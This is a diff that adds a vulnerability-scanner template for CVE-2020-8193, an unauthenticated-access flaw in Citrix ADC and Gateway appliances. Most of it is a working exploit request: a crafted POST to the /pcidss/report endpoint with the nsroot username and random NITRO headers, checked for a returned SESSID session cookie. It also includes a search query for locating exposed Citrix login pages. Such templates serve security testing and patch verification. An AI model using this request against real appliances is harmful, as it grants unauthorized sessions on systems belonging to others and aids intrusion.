@@ -1,0 +1,26 @@
+name: Citrix Unauthorized CVE-2020-8193
+manual: true
+query: (app="citrix-公司产品" | title="Citrix Login" | body="Citrix ADC")
+transport: http
+set:
+  str2: randomLowercase(8)
+  str1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1
+      headers:
+        Content-Type: application/xml
+        X-NITRO-PASS: '{{str1}}'
+        X-NITRO-USER: '{{str2}}'
+      body: <appfwprofile><login></login></appfwprofile>
+    expression: response.status == 406 && response.raw_header.bcontains(b"SESSID=")
+expression: r0()
+detail:
+  author: aetkrad
+  description: Improper access control in Citrix ADC and Citrix Gateway versions before
+    13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN
+    WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows unauthenticated access
+    to certain URL endpoints
+  tags: Unauthorized
